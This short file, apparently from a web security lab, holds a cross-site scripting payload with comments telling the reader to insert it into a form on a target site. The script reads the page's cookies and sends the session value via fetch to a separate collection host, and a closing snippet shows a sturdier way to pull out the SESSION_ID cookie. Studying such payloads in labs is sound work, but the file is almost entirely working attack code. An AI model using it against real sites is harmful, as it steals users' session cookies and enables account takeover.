// Insert this code, between script tags, into the form of badwebsite to carry
// out the XSS attack.

// mode: 'no-cors' is not strictly needed
<script>
  var cookieKeyValue = document.cookie.split('=');
  var value = cookieKeyValue[1];
  fetch('http://decoder.127.0.0.1.xip.io:8080/?key=' + value, {
    mode: 'no-cors'
  });
</script>

// A more robust way of finding the SESSION_ID cookie (it just happened to be
// the first cookie but we can't depend on that) is
document.cookie.slice(
  document.cookie.indexOf("SESSION_ID")
).split('=')[1];
